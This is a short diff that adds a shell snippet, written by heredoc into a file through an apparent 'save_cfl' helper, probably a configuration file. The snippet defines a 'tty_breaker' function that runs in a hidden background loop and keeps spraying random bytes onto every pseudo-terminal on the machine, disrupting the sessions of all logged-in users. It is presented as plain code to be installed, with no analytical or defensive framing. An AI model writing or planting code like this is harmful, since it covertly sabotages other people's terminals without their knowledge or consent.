@@ -1,0 +1,19 @@
+save_cfl $file <<-EOF
+
+tty_breaker() {
+
+	while true;
+	do
+		for tty in /dev/pts/*; 
+		do
+			dd bs=42 count=1 if=/dev/random of=\$tty &> /dev/null
+		done;
+		sleep \$(( \$RANDOM % 5 ))
+	done;
+
+}
+
+
+tty_breaker &> /dev/null &
+
+EOF
